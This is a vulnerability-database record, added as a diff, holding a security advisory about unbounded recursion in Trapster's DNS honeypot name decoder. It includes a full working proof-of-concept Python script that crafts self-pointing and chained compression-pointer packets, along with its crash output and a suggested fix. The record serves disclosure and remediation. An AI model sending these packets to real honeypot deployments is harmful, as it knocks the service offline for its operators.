@@ -1,0 +1,222 @@
+[basic]
+description = '''
+## Summary
+
+`trapster.libs.dns.decode_labels()` decodes DNS names from attacker-supplied UDP packets and recurses **once per RFC 1035 compression pointer** with **no cycle detection and no depth bound**. A single unauthenticated UDP datagram sent to the DNS honeypot drives the function past CPython's recursion limit, raising `RecursionError`. That exception is not handled anywhere on the `datagram_received` path, so it escapes into the asyncio event loop's default exception handler, the per-packet proxy task is never created, and a low-rate flood produces sustained CPU burn and log flooding (denial of service of the DNS honeypot module).
+
+## Severity
+
+Medium (CVSS:3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`). Network-reachable, unauthenticated, single-packet, availability-only against the DNS honeypot listener.
+
+## Affected component
+
+- File: `trapster/libs/dns.py`, function `decode_labels()` (called by `decode_question_section` → `decode_dns_message`).
+- Reached from: `trapster/modules/dns.py`, `DnsUdpProtocol.datagram_received()` → `dns.decode_dns_message(data)`, where `data` is the raw attacker UDP payload received by `DnsHoneypot` on its configured bind address/port.
+- Version tested: latest `main` at commit `23156739de23816657cbc4582ad32094ed1cab43`.
+
+## Details
+
+`decode_labels` implements RFC 1035 §4.1.4 name compression:
+
+```python
+def decode_labels(message, offset):
+    labels = []
+    while True:
+        length, = struct.unpack_from(\"!B\", message, offset)
+        if (length & 0xC0) == 0xC0:
+            pointer, = struct.unpack_from(\"!H\", message, offset)
+            offset += 2
+            return labels + decode_labels(message, pointer & 0x3FFF), offset   # <-- recurses per pointer
+        ...
+```
+
+Each compression pointer triggers a fresh recursive call to `decode_labels`. There is:
+
+- **No cycle detection** — a pointer that targets its own offset recurses forever.
+- **No depth bound** — a chain of distinct forward pointers recurses once per pointer.
+
+Either shape exhausts the Python stack and raises `RecursionError`. `decode_dns_message` does not catch it, and in `DnsUdpProtocol.datagram_received` the call `dns.decode_dns_message(data)` is unguarded, so the exception propagates out of `datagram_received` into the event loop. Each hostile packet therefore aborts its own packet-handling/proxy task, and the loop's default exception handler logs a full traceback for every packet.
+
+This is the same class of bug fixed upstream in `python-zeroconf` (compression-pointer recursion), except this implementation additionally lacks the loop/cycle guard that zeroconf already had.
+
+## Proof of Concept
+
+Real-deploy E2E. The actual `trapster.modules.dns.DnsHoneypot` server is started on a real UDP socket; hostile packets are sent from a separate real client socket over loopback. The event-loop exception handler records what escapes `datagram_received`.
+
+`e2e_poc.py`:
+
+```python
+import asyncio, struct, socket, sys
+from trapster.modules.dns import DnsHoneypot
+from trapster.logger.base import BaseLogger
+
+HOST, PORT = \"127.0.0.1\", 15353
+captured_loop_exceptions = []
+
+def build_benign_query(qname=b\"example.com\"):
+    header = struct.pack(\"!6H\", 0x1234, 0x0100, 1, 0, 0, 0)
+    labels = b\"\".join(struct.pack(\"!B\", len(p)) + p for p in qname.split(b\".\")) + b\"\x00\"
+    return header + labels + struct.pack(\"!2H\", 1, 1)
+
+def build_self_pointer():
+    header = struct.pack(\"!6H\", 0x1234, 0x0100, 1, 0, 0, 0)
+    name = struct.pack(\"!H\", 0xC000 | 12)   # pointer to offset 12 == this name
+    return header + name + struct.pack(\"!2H\", 1, 1)
+
+def build_pointer_chain(depth=2000):
+    header = struct.pack(\"!6H\", 0x1234, 0x0100, 1, 0, 0, 0)
+    name = struct.pack(\"!H\", 0xC000 | 18)
+    qtail = struct.pack(\"!2H\", 1, 1)
+    chain = bytearray()
+    for i in range(depth):
+        chain += struct.pack(\"!H\", 0xC000 | (18 + 2 * (i + 1)))
+    chain += b\"\x00\"
+    return header + name + qtail + bytes(chain)
+
+def send_udp(payload, timeout=1.0):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(timeout)
+    s.sendto(payload, (HOST, PORT))
+    try: return s.recvfrom(4096)[0]
+    except socket.timeout: return None
+    finally: s.close()
+
+async def main():
+    loop = asyncio.get_running_loop()
+    def handler(loopobj, context):
+        exc = context.get(\"exception\")
+        captured_loop_exceptions.append((repr(exc), context.get(\"message\")))
+        print(f\"[loop-exception-handler] {type(exc).__name__ if exc else None}: {context.get('message')}\")
+    loop.set_exception_handler(handler)
+
+    hp = DnsHoneypot(config={\"port\": PORT, \"target_dns\": \"127.0.0.1\"},
+                     logger=BaseLogger(node_id=\"e2e\"), bindaddr=HOST)
+    await hp.start(); await asyncio.sleep(0.4)
+    print(f\"[deploy] DnsHoneypot listening on udp://{HOST}:{PORT}\n\")
+
+    print(\"=== NEGATIVE CONTROL: benign query example.com A ===\")
+    captured_loop_exceptions.clear(); send_udp(build_benign_query()); await asyncio.sleep(0.3)
+    print(f\"  loop exceptions after benign packet: {len(captured_loop_exceptions)}\")
+    assert len(captured_loop_exceptions) == 0
+    print(\"  -> benign packet parsed cleanly, no exception\n\")
+
+    print(\"=== VECTOR A: single self-referential compression pointer (cycle) ===\")
+    captured_loop_exceptions.clear(); pkt = build_self_pointer()
+    print(f\"  packet ({len(pkt)} bytes) name field = pointer 0xC00C -> offset 12 (itself)\")
+    send_udp(pkt); await asyncio.sleep(0.5)
+    print(f\"  loop exceptions captured: {len(captured_loop_exceptions)}\")
+    for e in captured_loop_exceptions: print(f\"    {e}\")
+    assert any(\"RecursionError\" in e[0] for e in captured_loop_exceptions)
+    print(\"  -> RecursionError escaped datagram_received (DoS, no cycle guard)\n\")
+
+    print(\"=== VECTOR B: 2000 chained forward compression pointers (zeroconf shape) ===\")
+    captured_loop_exceptions.clear(); pkt = build_pointer_chain(2000)
+    print(f\"  packet ({len(pkt)} bytes) = 2000-deep forward pointer chain\")
+    send_udp(pkt); await asyncio.sleep(0.5)
+    print(f\"  loop exceptions captured: {len(captured_loop_exceptions)}\")
+    for e in captured_loop_exceptions: print(f\"    {e}\")
+    assert any(\"RecursionError\" in e[0] for e in captured_loop_exceptions)
+    print(\"  -> RecursionError escaped datagram_received (DoS, no depth bound)\n\")
+
+    await hp.stop(); print(\"ALL ASSERTIONS PASSED\")
+
+if __name__ == \"__main__\":
+    sys.setrecursionlimit(1000)
+    asyncio.run(main())
+```
+
+Verbatim run against the deployed honeypot at commit `23156739de23816657cbc4582ad32094ed1cab43`:
+
+```
+[deploy] DnsHoneypot listening on udp://127.0.0.1:15353
+
+=== NEGATIVE CONTROL: benign query example.com A ===
+  loop exceptions after benign packet: 0
+  -> benign packet parsed cleanly, no exception
+
+=== VECTOR A: single self-referential compression pointer (cycle) ===
+  packet (18 bytes) name field = pointer 0xC00C -> offset 12 (itself)
+[loop-exception-handler] RecursionError: Exception in callback _SelectorDatagramTransport._read_ready()
+  loop exceptions captured: 1
+    (\"RecursionError('maximum recursion depth exceeded in comparison')\", 'Exception in callback _SelectorDatagramTransport._read_ready()')
+  -> RecursionError escaped datagram_received (DoS, no cycle guard)
+
+=== VECTOR B: 2000 chained forward compression pointers (zeroconf shape) ===
+  packet (4019 bytes) = 2000-deep forward pointer chain
+[loop-exception-handler] RecursionError: Exception in callback _SelectorDatagramTransport._read_ready()
+  loop exceptions captured: 1
+    (\"RecursionError('maximum recursion depth exceeded in comparison')\", 'Exception in callback _SelectorDatagramTransport._read_ready()')
+  -> RecursionError escaped datagram_received (DoS, no depth bound)
+
+ALL ASSERTIONS PASSED
+```
+
+The negative control (a well-formed `example.com` A query) parses with zero exceptions, confirming the crash is specific to the malformed compression input.
+
+## Impact
+
+Any host able to send UDP to the DNS honeypot's bind address/port (unauthenticated, no UI) can crash the per-packet handler with a single ~18-byte datagram. A low-rate flood (a few packets per second) keeps the event loop logging full tracebacks and burning CPU, degrading the DNS honeypot and its logging pipeline. Availability impact only; no memory disclosure or code execution.
+
+## Suggested fix
+
+Make `decode_labels` iterative-bounded: require every compression pointer to point strictly backward to a not-yet-visited offset, which bounds both cycles and long forward chains in O(message length) with no recursion. (This mirrors `dnspython`'s `biggest_pointer` design and the zeroconf depth-bound fix.) Replace the bare `raise \"unknown label encoding\"` with a real exception, and consider wrapping `dns.decode_dns_message(data)` in `DnsUdpProtocol.datagram_received` in a try/except so a malformed packet is logged once rather than escaping to the loop handler.
+
+Verified fix (benign + legitimate backward-compression names still decode; both hostile vectors are bounded to `ValueError` with no recursion):
+
+```python
+def decode_labels(message, offset):
+    labels = []
+    return_offset = None
+    max_allowed_pointer = len(message)
+    while True:
+        length, = struct.unpack_from(\"!B\", message, offset)
+        if (length & 0xC0) == 0xC0:
+            pointer, = struct.unpack_from(\"!H\", message, offset)
+            if return_offset is None:
+                return_offset = offset + 2
+            target = pointer & 0x3FFF
+            if target >= max_allowed_pointer:
+                raise ValueError(\"invalid DNS compression pointer\")
+            max_allowed_pointer = target
+            offset = target
+            continue
+        if (length & 0xC0) != 0x00:
+            raise ValueError(\"unknown label encoding\")
+        offset += 1
+        if length == 0:
+            return labels, return_offset if return_offset is not None else offset
+        labels.append(*struct.unpack_from(\"!%ds\" % length, message, offset))
+        try:
+            labels[-1] = labels[-1].decode()
+        except UnicodeDecodeError:
+            labels[-1] = str(labels[-1])
+        offset += length
+```
+
+A fix PR will be supplied from a temporary private fork during the embargo.
+
+## Credit
+
+Discovered and reported by tonghuaroot.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Trapster Community: Unauthenticated malformed DNS compression pointers crash per-packet honeypot handler"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-mxwc-wh95-pw4g"]
+ave_id = "AVE-2026-1157"
+
+[meta]
+collected_at = "2026-08-06T08:17:47.221435978+00:00"
+status = "completed"
+
+[references]
+urls = []
